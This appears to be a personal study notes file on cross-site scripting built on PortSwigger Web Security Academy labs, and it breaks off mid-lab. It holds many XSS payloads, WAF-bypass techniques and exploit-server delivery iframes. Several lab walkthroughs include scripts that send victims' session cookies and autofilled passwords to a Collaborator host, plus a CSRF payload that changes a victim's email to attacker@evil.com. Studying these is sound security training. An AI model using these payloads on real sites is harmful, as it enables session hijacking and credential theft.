# XSS Notes — PortSwigger Web Security Academy

---

## DISTINCT XSS VULNERABILITY TYPES

### 1. Reflected XSS
- Payload is in the HTTP **request** (URL param, form input, header).
- Server reflects it back in the **immediate response** — never stored.
- Victim must be tricked into clicking a crafted link.
- Example: `https://site.com/search?q=<script>alert(1)</script>`

### 2. Stored XSS (Persistent XSS)
- Payload is **saved to the database** (comment, username, profile bio, etc.).
- Executes in the browser of **every user** who loads the affected page.
- More dangerous than reflected — no crafted link needed.
- Example: posting `<script>alert(1)</script>` in a comment field.

### 3. DOM-Based XSS
- The vulnerability lives entirely in **client-side JavaScript** — the server is not involved.
- A **source** (attacker-controlled input: `location.search`, `location.hash`, `document.referrer`, `document.cookie`) feeds data into a **sink** (a dangerous JS function that executes it).
- Common sources: `location.search`, `location.hash`, `location.href`
- Common sinks: `document.write()`, `innerHTML`, `eval()`, `setTimeout()`, `jQuery()`, `href`
- Example: JS reads `location.search` and writes it to the DOM with `document.write()` — no sanitisation.

### 4. Reflected DOM XSS
- A hybrid: server reflects data into a JavaScript variable, and then **client-side JS** writes that variable into a dangerous sink.
- Not purely server-side reflected, not purely DOM — it's both.

### 5. Stored DOM XSS
- Stored variant of DOM XSS. Server stores data, serves it in a JSON/JS response, client-side code writes it into a sink unsafely.

### 6. XSS via HTTP Headers
- Injection via `User-Agent`, `Referer`, `X-Forwarded-For` when these values are displayed on-page.
- Less common but still seen in admin panels and analytics dashboards.

### 7. XSS in JSON/REST APIs
- API response contains unsanitised user input that gets rendered by a frontend framework.
- Bypassed by injecting into JSON values: `{"name": "<img src=x onerror=alert(1)>"}`

### 8. Blind XSS
- Payload executes in a different context you don't directly see (admin dashboard, log viewer, support ticket system).
- Confirmed via callbacks to Burp Collaborator or XSS Hunter.
- Example: payload in a support message that fires when an admin opens the ticket.

### 9. Self-XSS
- Only fires in the victim's own browser and cannot be triggered externally without social engineering.
- Generally out of scope in bug bounty, but can be escalated via CSRF.

### 10. Mutation XSS (mXSS)
- Browser's HTML parser mutates/transforms sanitised input into executable XSS during re-parsing.
- Particularly relevant in rich-text editors and innerHTML sanitisation.
- Difficult to detect — the payload looks safe before DOM insertion.

---

## XSS INJECTION CONTEXTS

Understanding **where** your input lands in the page source determines what payload you need.
Always "View Page Source" (Ctrl+U) to see exactly where your input appears.

| Context | Where input lands | Example | Goal |
|---|---|---|---|
| **HTML body** | Between tags | `<p>INPUT</p>` | Inject new tags: `<script>`, `<img onerror=>` |
| **HTML attribute** | Inside a tag attribute | `<input value="INPUT">` | Break out of attribute: `">`, inject event handler |
| **HTML attribute (unquoted)** | `<input value=INPUT>` | Inject space + event: `x onmouseover=alert(1)` |
| **JavaScript string** | `var x = 'INPUT'` | Break string: `'-alert(1)-'` or `';alert(1)//` |
| **JavaScript string (template literal)** | `` var x = `INPUT` `` | Inject expression: `${alert(1)}` |
| **href attribute** | `<a href="INPUT">` | Inject JS URL: `javascript:alert(1)` |
| **onclick / event handler** | `onclick="INPUT"` | Inject expression: `alert(1)` |
| **CSS** | `style="INPUT"` | `expression(alert(1))` (old IE) |

---

## XSS TESTING SOP

### Step 1 — Map Injection Points
- URL query parameters (`?q=`, `?search=`, `?redirect=`)
- Form inputs (search boxes, login, signup, comments, bio fields)
- URL path segments (`/profile/INPUT`)
- HTTP Headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
- Hash fragment (`#INPUT` — only processed client-side, never sent to server)
- JSON/API request bodies

### Step 2 — Identify the Injection Context
- Submit a unique canary string: `xsstest123`
- View Page Source (Ctrl+U) — find where it appears in the raw HTML
- Is it in a tag body? An attribute? A JS string? A JS variable? An href?
- This tells you which payload shape to use.

### Step 3 — Test for Basic Reflection / Storage
| Probe | What you're testing |
|---|---|
| `<` | Does the browser receive a literal `<` or `&lt;`? |
| `"` | Encoded to `&quot;` or reflected raw? |
| `'` | Encoded to `&#x27;` or reflected raw? |
| `<script>alert(1)</script>` | Most basic XSS — works if nothing is filtered |
| `<img src=x onerror=alert(1)>` | Tag-based, no `<script>` needed |
| `"><script>alert(1)</script>` | Break out of an attribute first, then inject |
| `javascript:alert(1)` | For href/src contexts |

### Step 4 — Check What's Filtered / Encoded
- Try variations: uppercase `<SCRIPT>`, mixed case `<ScRiPt>`, self-closing `<script/>`
- Check if `alert` is blocked — use `alert(document.domain)` or `confirm(1)` or `prompt(1)`
- Check if parentheses are blocked — try `alert\`1\`` (template literal call)
- Check if angle brackets are encoded — you may be stuck inside an existing tag (attribute context)

### Step 5 — Context-Specific Bypass Attempts
**HTML body context:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

**Attribute context (double-quoted):**
```html
" onmouseover="alert(1)
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

**Attribute context (single-quoted):**
```html
' onmouseover='alert(1)
'><script>alert(1)</script>
```

**href context:**
```html
javascript:alert(1)
javascript:alert(document.domain)
```

**JavaScript string context:**
```javascript
'-alert(1)-'
';alert(1)//
\';alert(1)//
${alert(1)}          ← template literals only
```

**onclick / event handler context:**
```javascript
alert(1)
alert(document.domain)
```

### Step 6 — Confirm Execution
- `alert(document.domain)` — proves the JS executes in the target's origin (important for bug bounty reports).
- `alert(document.cookie)` — shows you can access session cookies.
- Open browser DevTools Console — if you see errors about your payload it confirms reflection but blocked execution.

### Step 7 — Escalate (if needed)
- Cookie theft via `document.cookie`
- Keylogger / password capture
- CSRF via JS-triggered requests
- Account takeover via password change without re-auth

---

## QUICK BURP WORKFLOW
1. Intercept request → Send to **Repeater** (Ctrl+R)
2. Insert canary string → View Page Source to find injection context
3. Craft payload based on context
4. Observe response — check if payload is reflected raw or encoded
5. If blind: use Burp **Collaborator** to catch callbacks
6. Use **Intruder** with an XSS wordlist for automated tag/event fuzzing
7. Confirm with `alert(document.domain)` in the browser

---

## USEFUL TOOLS & EXTENSIONS
- **Hackvertor** (BApp Store) — encoding/decoding transformations (HTML entity, Unicode, etc.)
- **DOM Invader** (built into Burp's browser) — automatically finds DOM sources and sinks
- **XSS Hunter** — blind XSS callback platform (free alternative to Pro Collaborator for XSS)
- **Burp Collaborator** (Pro) — catch blind XSS callbacks

---
---

## PORTSWIGGER LABS

---

### #01 — Reflected XSS into HTML context with nothing encoded

**URL:** https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded  
**Vulnerability:** Search functionality  
**Aim:** Perform a reflected XSS attack that calls `alert`

**Background:**
The simplest possible XSS. User input from the search box is reflected directly into the HTML response with zero sanitisation or encoding. No filters, no WAF.

**Analysis:**
```
Search input: <script>alert(1)</script>

Page source returned:
<h1>0 search results for '<script>alert(1)</script>'</h1>

→ Browser parses the <script> tag → alert fires.
```

**Payload used:** `<script>alert(1)</script>`

> 📝 This is your baseline. Real apps almost never leave it this open, but the concept — user input rendered directly into HTML — is the root of every XSS vulnerability. Everything from here builds on this: how encoding, context, and filters complicate the injection.

---

### #02 — Stored XSS into HTML context with nothing encoded

**URL:** https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded  
**Vulnerability:** Blog comment section  
**Aim:** Submit a comment that calls `alert` when the blog post is viewed

**Background:**
Same zero-encoding scenario as Lab 01, but the payload is **stored** — submitted via a comment form, saved to the database, and executed in the browser of every visitor who loads the page.

**Analysis:**
```
Comment body submitted: <script>alert(1)</script>

Stored in DB. When any user loads the blog post:
<p><script>alert(1)</script></p>
→ Browser executes the script → alert fires for everyone.
```

**Payload used:** `<script>alert(1)</script>` (in the comment body)

> 📝 Stored XSS is significantly more impactful than reflected — it doesn't need a victim to click a crafted link. Every visitor triggers it. In a real app, stored XSS in a comment visible to admins = account takeover without the admin doing anything suspicious.

---

### #03 — DOM XSS in `document.write` sink using source `location.search`

**URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink  
**Vulnerability:** Search functionality (client-side JS)  
**Aim:** Perform a DOM-based XSS attack that calls `alert`

**Background:**
The page's JavaScript reads from `location.search` (the URL's query string) and passes it directly into `document.write()` — a sink that writes raw HTML into the DOM. The server never touches this data.

**Analysis:**
```javascript
// Vulnerable JS on the page:
document.write('<img src="/resources/images/tracker.gif?searchTerms=' + location.search + '">');

// Input in URL: ?search=test
// Resulting HTML:
<img src="/resources/images/tracker.gif?searchTerms=?search=test">

// Inject to break out of the src attribute and create an onerror handler:
// URL: ?search="><svg onload=alert(1)>

// Resulting HTML:
<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>">
→ The <img> tag is broken, SVG renders and fires onload → alert executes.
```

**Payload used:** `"><svg onload=alert(1)>`

> 📝 `document.write()` is one of the most dangerous DOM sinks — it writes raw HTML. `location.search` is your source (it contains everything after `?` in the URL, fully attacker-controlled). DOM XSS never goes through the server, so server-side WAFs and sanitisation don't help here at all.

---

### #04 — DOM XSS in `innerHTML` sink using source `location.search`

**URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink  
**Vulnerability:** Search functionality (client-side JS)  
**Aim:** Perform a DOM-based XSS attack that calls `alert`

**Background:**
Similar to Lab 03 but uses `innerHTML` instead of `document.write()`. `innerHTML` does **not** execute `<script>` tags directly — the browser refuses to run scripts injected via innerHTML. But event-handler-based tags still work.

**Analysis:**
```javascript
// Vulnerable JS:
document.getElementById('searchMessage').innerHTML = location.search.slice(3);
// (slices off the "?q=" prefix)

// ❌ This won't work — innerHTML ignores <script>:
?q=<script>alert(1)</script>

// ✅ Use an event-triggered tag instead:
?q=<img src=x onerror=alert(1)>
// Resulting DOM:
<div id="searchMessage"><img src=x onerror=alert(1)></div>
// src=x fails to load → onerror fires → alert executes
```

**Payload used:** `<img src=x onerror=alert(1)>`

> 📝 `innerHTML` silently drops `<script>` tags — a partial mitigation browsers apply. Event handlers (`onerror`, `onload`, `onfocus`, etc.) are NOT blocked. This is a crucial distinction: the sink matters as much as the source. Always try event-based payloads when script tags are blocked.

---

### #05 — DOM XSS in jQuery `anchor href` attribute sink using `location.search` source

**URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink  
**Vulnerability:** "Back" link on feedback page (jQuery)  
**Aim:** Make the "back" link call `alert(document.cookie)`

**Background:**
jQuery's `.attr()` method is used to set the `href` of an anchor tag from `location.search`. When the sink is an `href` attribute, injecting `javascript:` creates a clickable XSS link.

**Analysis:**
```javascript
// Vulnerable JS (jQuery):
$(function() {
    $('#backLink').attr("href", new URLSearchParams(window.location.search).get('returnPath'));
});

// Normal URL:
/feedback?returnPath=/

// Malicious URL:
/feedback?returnPath=javascript:alert(document.cookie)

// Resulting HTML:
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
// When the victim clicks "Back" → alert(document.cookie) executes
```

**Payload used:** `javascript:alert(document.cookie)` (in the `returnPath` parameter)

> 📝 `javascript:` URIs are a classic XSS vector in `href` and `src` attributes. When a user clicks the link, the browser executes the JS in page context. This is why you should never populate `href` from user input without validating it starts with `http://` or `https://`. The `returnPath` parameter pattern is extremely common in real apps (login redirects, back buttons).

---

### #06 — DOM XSS in jQuery selector sink using a hashchange event

**URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event  
**Vulnerability:** Homepage — jQuery selector reads from `location.hash`  
**Aim:** Deliver an exploit via the exploit server that calls `print()`

**Background:**
The page listens for a `hashchange` event and passes `location.hash` into a jQuery `$()` selector — which can interpret HTML strings as DOM elements if not sanitised. This is the jQuery selector-as-sink vulnerability.

**Analysis:**
```javascript
// Vulnerable JS:
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});

// Inject into hash to create an img element via the jQuery selector:
#<img src=x onerror=print()>

// jQuery tries to find an element matching this "selector" — but it actually
// parses it as HTML and inserts the img into the DOM → onerror fires → print()

// Problem: hash changes don't reload the page, victim needs to navigate to
// a URL with the payload hash. Deliver via exploit server using an iframe:
<iframe src="https://TARGET.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

**Steps:**
1. Go to the exploit server
2. Paste the iframe payload (with TARGET replaced) into the body
3. Store and deliver to victim

> 📝 `location.hash` is a DOM source that **never gets sent to the server** — the hash is purely client-side. The jQuery `$()` function is a sink because it can parse HTML strings, not just CSS selectors. The iframe trick forces the hash change to happen after page load, triggering the hashchange event listener.

---

### #07 — Reflected XSS into attribute with angle brackets HTML-encoded

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded  
**Vulnerability:** Search functionality  
**Aim:** Perform a reflected XSS attack that calls `alert`

**Background:**
Angle brackets `< >` are HTML-encoded (converted to `&lt;` and `&gt;`), so you can't inject new tags. But the input still lands inside an HTML attribute — and attribute values can contain event handlers.

**Analysis:**
```
Search: test
Page source: <input type=text placeholder='Search the blog...' value="test">

Angle brackets encoded — can't break out with "><script>
But: double quotes are NOT encoded.

Inject: " onmouseover="alert(1)
Resulting HTML: <input ... value="" onmouseover="alert(1)">
→ Hover over the input box → alert fires.
```

**Payload used:** `" onmouseover="alert(1)`

> 📝 When you're stuck inside an attribute and can't inject tags, the goal shifts: **break out of the attribute value** (with `"`) and **add a new event handler** within the same opening tag. The key insight is that `onmouseover`, `onfocus`, `onblur`, `onclick` etc. are all valid HTML attributes. Encoding `<` and `>` but not `"` is a partial and ineffective sanitisation.

---

### #08 — Stored XSS into anchor `href` attribute with double quotes HTML-encoded

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded  
**Vulnerability:** Comment "website" field  
**Aim:** Submit a comment that calls `alert(document.cookie)` when the author name is clicked

**Background:**
The comment form has a "Website" field whose value is placed into the `href` of the author's name link. Double quotes are encoded, so you can't break out of the attribute. But you can control the entire `href` value — and `javascript:` is a valid URI scheme.

**Analysis:**
```
Submit comment with website: javascript:alert(document.cookie)

Resulting HTML:
<a href="javascript:alert(document.cookie)">Author Name</a>

Clicking the author name → alert(document.cookie) fires.
```

**Payload used:** `javascript:alert(document.cookie)` (in the website field)

> 📝 If you control the **entire value** of an `href`, you don't need to break out of anything — just replace the value entirely with a `javascript:` URI. This is why input sanitisation for URL fields must explicitly **allowlist** `http://` and `https://` schemes and reject everything else.

---

### #09 — Reflected XSS into a JavaScript string with angle brackets HTML-encoded

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded  
**Vulnerability:** Search functionality  
**Aim:** Perform a reflected XSS attack that calls `alert`

**Background:**
Angle brackets are encoded, so you can't inject HTML tags. But the input lands inside a JavaScript string in a `<script>` block. You can break out of the JS string directly — no HTML tags needed.

**Analysis:**
```javascript
// Search: test
// Page source (inside a <script> block):
var searchTerms = 'test';
document.write('<img src="/tracker?search=test">');

// Inject: '-alert(1)-'
// Resulting JS:
var searchTerms = ''-alert(1)-'';
// SyntaxError — too many quotes

// Better: close the string, call alert, open a new string, comment out rest:
// Inject: ';alert(1)//
// Resulting JS:
var searchTerms = '';alert(1)//'';
→ First statement ends the var declaration. Second: alert(1). Rest is commented out.
```

**Payload used:** `';alert(1)//`

> 📝 When you're inside a JS string, you break out with the same quote character that opens the string (usually `'` or `"`). Then you execute your code, then comment out the remainder (`//` for single-line, `/* */` for multi-line) to prevent syntax errors that would stop execution. No HTML angle brackets needed at all.

---

### #10 — DOM XSS in `document.write` sink using `location.search` inside a select element

**URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element  
**Vulnerability:** Stock check feature — `storeId` parameter  
**Aim:** Perform a DOM-based XSS attack that calls `alert`

**Background:**
The vulnerable JS writes a `<select>` element using `document.write()` and populates an `<option>` with a URL parameter. You need to break out of the `<select>` context.

**Analysis:**
```javascript
// Vulnerable JS:
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
// ... more options

// URL: ?productId=1&storeId=test
// Writes: <option selected>test</option>

// Inject to break out of <select> entirely:
// storeId=</select><img src=1 onerror=alert(1)>

// Resulting HTML:
<select name="storeId"><option selected></select><img src=1 onerror=alert(1)></option>
// The </select> closes the dropdown, then the img onerror fires.
```

**Payload used:** `</select><img src=1 onerror=alert(1)>` (in `storeId` parameter)

> 📝 Inside certain HTML elements (`<select>`, `<textarea>`, `<title>`), the browser ignores most injected tags — child content is treated as text, not HTML. The trick is **breaking out** of the enclosing element first (using its closing tag), then injecting in normal HTML context. The same principle applies to `</textarea>` and `</title>` escapes.

---

### #11 — DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression  
**Vulnerability:** Search — AngularJS app (`ng-app` directive present)  
**Aim:** Perform a DOM-based XSS attack that calls `alert`

**Background:**
AngularJS processes `{{ }}` template expressions within any element that has `ng-app`. If input is reflected inside an `ng-app` controlled element, AngularJS will **evaluate** whatever is between `{{ }}` as JavaScript — even without any HTML injection.

**Analysis:**
```
The page body has: <body ng-app>

Search: {{7*7}} → page shows: 49
→ AngularJS is evaluating our expression!

Inject: {{constructor.constructor('alert(1)')()}}
→ AngularJS evaluates the expression, which constructs a Function from the string and calls it.
→ alert fires.
```

**Payload used:** `{{constructor.constructor('alert(1)')()}}`

> 📝 AngularJS expressions (`{{ }}`) execute in a sandboxed scope, but the sandbox has been bypassed in older versions. `constructor.constructor` is the Function constructor — it lets you run arbitrary JS from a string. This is called a **sandbox escape**. If you ever see `ng-app` or `ng-controller` in a page's source while your input is on the page, try `{{7*7}}` first to confirm AngularJS template injection.

---

### #12 — Reflected DOM XSS

**URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected  
**Vulnerability:** Search functionality — server reflects data into a JS variable, client writes it to DOM  
**Aim:** Perform a reflected DOM XSS attack that calls `alert`

**Background:**
The server JSON-encodes the search term and injects it into a JavaScript variable. A client-side script then reads that variable and passes it to `eval()` or `document.write()`. Server-side encoding looks safe, but the JS context allows escape.

**Analysis:**
```javascript
// Server response includes:
<script>
  var searchResultsObj = {"results":[],"searchTerm":"test"}
</script>

// A separate JS file then does something like:
eval('var x = ' + searchResultsObj);
// or writes searchTerm to the DOM

// The JSON is reflected inside a JS string. Breaking out:
// Input: \"-alert(1)}//
// The \" escapes the backslash the server adds, closing the JSON string differently.
// Resulting reflected content:
{"results":[],"searchTerm":"\\"-alert(1)}//"}
// In the eval context: the \\ becomes a literal backslash, the " closes the string,
// -alert(1) executes, }// comments out the rest.
```

**Payload used:** `\"-alert(1)}//`

> 📝 Reflected DOM XSS is subtle — the server might encode the data correctly for JSON, but the JS context it's placed in creates a new injection surface. The `\"` trick works because the server escapes `"` to `\"`, but if you send `\"` the server makes it `\\"` — and `\\` in a JS string is just a literal backslash, leaving the `"` to close the string. Pay close attention to how many layers of encoding are applied.

---

### #13 — Stored DOM XSS

**URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored  
**Vulnerability:** Blog comments — stored data written to DOM via JS  
**Aim:** Submit a comment that calls `alert` when the post is viewed

**Background:**
The application loads comments from an API endpoint (JSON), and client-side JS renders them into the page using `innerHTML`. The server applies some sanitisation, but the client-side rendering creates a bypass opportunity.

**Analysis:**
```javascript
// Server stores comment. Page loads, JS fetches /api/comments?postId=1 → JSON
// A script iterates comments and does:
commentDiv.innerHTML = comment.body;

// Server encodes <script> tags — they appear as &lt;script&gt; in HTML.
// BUT: innerHTML decodes HTML entities back to characters before setting.
// So &lt;script&gt; just shows as text — it doesn't execute.

// The server doesn't encode angle brackets inside the comment body for innerHTML.
// Use an event-handler based payload (no <script> needed):
<><img src=1 onerror=alert(1)>

// The <> at the start is needed to confuse the server-side "sanitisation" which
// only removes the first occurrence of the tag. The real payload comes after.
```

**Payload used:** `<><img src=1 onerror=alert(1)>`

> 📝 The `<>` prefix exploits a quirk where the server's sanitiser only strips one level of tag. When JS reads the stored string and assigns it to `innerHTML`, it re-parses the HTML — and the `<img onerror>` fires. This is a mini example of **mutation XSS**: something that looks sanitised but becomes dangerous when re-parsed by the browser's HTML engine.

---

### #14 — Exploiting XSS to steal cookies

**URL:** https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies  
**Vulnerability:** Blog comments (stored XSS)  
**Aim:** Steal the session cookie of a simulated victim, use it to hijack their session

**Background:**
This lab shifts from proof-of-concept (`alert`) to actual exploitation. You need to exfiltrate `document.cookie` from another user's browser to your server (Burp Collaborator).

**Analysis:**
```javascript
// Payload: fetch the attacker's server with the cookie as a URL parameter
// Using Burp Collaborator as the attacker's server:
<script>
fetch('https://COLLABORATOR.NET', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

// OR using an image request (simpler, no fetch API needed):
<script>
document.location='https://COLLABORATOR.NET/?c='+document.cookie;
</script>

// Submit as a blog comment.
// When the victim (simulated by PortSwigger) views the post, their browser executes
// the script and sends their cookie to your Collaborator server.
// Poll Collaborator → find the cookie in the request body/URL.
// Use it in Burp Repeater: add Cookie: session=STOLEN_VALUE to a request → logged in as victim.
```

**Steps:**
1. Open Burp Collaborator (Pro) → Copy subdomain
2. Craft payload with your Collaborator URL
3. Submit as blog comment
4. Poll Collaborator → grab session cookie from incoming request
5. In Burp, go to `/my-account` → Intercept → Replace session cookie → Forward → Access victim's account

> 📝 `document.cookie` is readable by any JS running in the page's origin — that's why the `HttpOnly` cookie flag exists. **HttpOnly** cookies are invisible to JS (`document.cookie` returns empty for them). Always check in DevTools (Application → Cookies) whether session cookies have `HttpOnly` set. If they do, cookie theft via XSS is blocked and you need to pivot to other impact (CSRF, keylogging, DOM manipulation).

---

### #15 — Exploiting XSS to capture passwords

**URL:** https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords  
**Vulnerability:** Blog comments (stored XSS)  
**Aim:** Capture a victim's auto-filled username and password using an injected form

**Background:**
When session cookies have `HttpOnly`, a common alternative is to inject a fake login form and capture the credentials when the browser auto-fills them (password managers and browser autofill trigger `input` events).

**Analysis:**
```html
<!-- Inject a fake username/password form into the page.
     When victim's browser autofills → the oninput/onchange event fires → sends creds to Collaborator -->
<input name=username id=username>
<input type=password name=password onchange="
  if(this.value.length)
    fetch('https://COLLABORATOR.NET',{
      method:'POST',
      mode:'no-cors',
      body:username.value+':'+this.value
    });
">
```

**Steps:**
1. Get Collaborator subdomain
2. Submit the payload above as a blog comment
3. Victim visits page → browser autofills credentials into the injected inputs → onchange fires
4. Poll Collaborator → see `username:password` in request body
5. Log in with the captured credentials

> 📝 This technique works because browser autofill doesn't check whether a form is "legitimate" — it fills any visible `<input type=password>` whose name matches saved credentials. This bypasses `HttpOnly` entirely because you're capturing credentials **as they're typed/autofilled**, before they ever become a cookie. In bug bounty, this is a critical severity finding.

---

### #16 — Exploiting XSS to perform CSRF

**URL:** https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf  
**Vulnerability:** Blog comments (stored XSS)  
**Aim:** Use XSS to make victims change their email address

**Background:**
XSS grants full JS execution in the victim's browser — meaning you can make authenticated requests on their behalf (CSRF-style). Unlike traditional CSRF, XSS can read CSRF tokens from the DOM first, bypassing anti-CSRF protection.

**Analysis:**
```javascript
// The email change endpoint requires:
// 1. A POST to /my-account/change-email
// 2. A valid CSRF token from the page

// XSS payload that:
// 1. Fetches /my-account to grab the CSRF token
// 2. Submits the email change with the token
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get', '/my-account', true);
req.send();

function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=attacker@evil.com');
}
</script>
```

**Payload used:** The script above, submitted as a blog comment.

> 📝 This is a critical concept: **XSS beats CSRF protection**. Anti-CSRF tokens are designed to stop cross-origin requests — but XSS executes in the **same origin**, so the token is freely readable from the DOM. This is why fixing XSS is almost always higher priority than fixing CSRF: an XSS vulnerability in an app renders all its CSRF protections irrelevant.

---

### #17 — Reflected XSS into HTML context with most tags and attributes blocked

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked  
**Vulnerability:** Search functionality with WAF  
**Aim:** Perform XSS that calls `print()`

**Background:**
A WAF blocks most common HTML tags and event attributes. You need to find which tags and attributes are **not** blocked using Burp Intruder and PortSwigger's XSS cheat sheet.

**Analysis:**
```
Step 1: Fuzz for allowed tags (Intruder)
- Payload: <§tag§>
- Wordlist: PortSwigger XSS cheat sheet tag list (copy from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- Find which tags return 200 (not blocked)
→ Result: <body> tag is allowed

Step 2: Fuzz for allowed events on <body> (Intruder)
- Payload: <body §event§=1>
- Wordlist: PortSwigger event list
- Find which events return 200
→ Result: onresize event is allowed

Step 3: Craft payload using <body onresize>
- The onresize event fires when the window is resized.
- Deliver via exploit server with an iframe that auto-resizes:

<iframe src="https://TARGET.web-security-academy.net/?search=%3Cbody+onresize%3Dprint()%3E"
onload=this.style.width='100px'>
```

**Payload (URL-encoded in search):** `<body onresize=print()>`  
**Delivered via exploit server iframe that triggers resize on load.**

> 📝 When common tags are blocked, fuzz systematically — don't guess. PortSwigger's XSS cheat sheet at `portswigger.net/web-security/cross-site-scripting/cheat-sheet` is a goldmine of tags and events. The trick here is that `<body>` is an unusual choice for injection (it's a structural tag), and `onresize` isn't in most WAF blocklists. Intruder + cheat sheet wordlist is the standard workflow for WAF bypass.

---

### #18 — Reflected XSS into HTML context with all tags blocked except custom ones

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked  
**Vulnerability:** Search functionality  
**Aim:** Perform XSS that calls `alert(document.cookie)`, delivered via exploit server

**Background:**
All standard HTML tags are blocked. However, **custom HTML elements** (any tag the browser doesn't recognise) are allowed. Custom elements can still have event handlers, including `onfocus`.

**Analysis:**
```html
<!-- Custom tag with onfocus + tabindex (needed for focus to be programmable) -->
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x

<!-- In the URL as: ?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>
     The #x at the end of the URL is the fragment — it causes the browser to
     auto-focus the element with id="x" on page load → onfocus fires immediately -->

<!-- Deliver via exploit server: -->
<script>
location = 'https://TARGET.web-security-academy.net/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x';
</script>
```

> 📝 Custom HTML elements (`<xss>`, `<foo>`, `<anything-not-standard>`) are valid HTML5 — browsers render them as generic block elements. The WAF only blocks known tag names. `tabindex=1` makes the custom element focusable. The `#x` URL fragment causes the browser to immediately focus the element with `id="x"` on page load, triggering `onfocus` without any user interaction.

---

### #19 — Reflected XSS with some SVG markup allowed

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed  
**Vulnerability:** Search — some SVG tags and events allowed  
**Aim:** Perform XSS that calls `alert`

**Background:**
The WAF blocks most tags but allows some SVG elements. SVG has its own set of event attributes — some of which WAFs miss.

**Analysis:**
```
Fuzz allowed tags → <svg>, <animatetransform>, <image>, <title> allowed

Fuzz allowed events on <animatetransform> → onbegin allowed

Payload:
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

**Payload used:** `<svg><animatetransform onbegin=alert(1) attributeName=transform>`

> 📝 SVG is a full XML-based vector graphics standard — it has its own event model. `onbegin` fires when an SVG animation begins. `<animatetransform>` is an SVG animation element. WAFs that focus on HTML events (`onclick`, `onload`) often miss SVG-specific events entirely. When standard tags are blocked, SVG and MathML namespaces are your next targets.

---

### #20 — Reflected XSS in canonical link tag

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag  
**Vulnerability:** Canonical `<link>` tag in `<head>`  
**Aim:** Inject an attribute that calls `alert` when a key combination is pressed

**Background:**
Input is reflected inside a `<link rel="canonical" href="...">` tag in the `<head>`. You can't inject visible elements or event handlers that fire on their own — but `<link>` tags support `accesskey`, which triggers events on keypresses.

**Analysis:**
```
URL reflects into:
<link rel="canonical" href="https://TARGET.web-security-academy.net/PATH"/>

Inject into the URL path: '/?%27accesskey=%27x%27onclick=%27alert(1)
(URL-decoded: '?'accesskey='x'onclick='alert(1))

Resulting tag:
<link rel="canonical" href="https://.../?'accesskey='x'onclick='alert(1)'"/>

Wait — single quotes inside an attribute might break out. Testing shows:
<link rel="canonical" href="https://TARGET.web-security-academy.net/'accesskey='x'onclick='alert(1)"/>

Trigger: Alt+Shift+X (Windows) or Control+Option+X (Mac) → accesskey activates → onclick fires
```

**Payload injected into URL:** `'accesskey='x'onclick='alert(1)`

> 📝 `accesskey` is an HTML attribute that binds a keyboard shortcut to an element. Combined with `onclick`, pressing the access key fires the click handler. This is a niche but real vector for injections inside `<head>` tags (`<link>`, `<meta>`) where you can inject attributes but can't trigger events visually. In bug bounty, this may require user interaction to trigger — factor that into severity.

---

### #21 — Reflected XSS into a JavaScript string with single quote and backslash escaped

**URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped  
**Vulnerability:** Search — JS string with `'` → `\'` and `\` → `\\` escaping  
**Aim:** Perform XSS that calls `alert`

**Background:**
The app escapes single quotes (`'` → `\'`) AND backslashes (`\` → `\\`). You can't simply break out of the string. But the input lands inside a `<script>` block — so you can break out of the `<script>` block itself using `</script>`.

**Analysis:**
```javascript
// Page source:
<script>
var searchTerms = 'test';
</script>

// Single quote escaped: \'  — can't break string with '
// Backslash escaped: \\ — can't nullify the escape with \

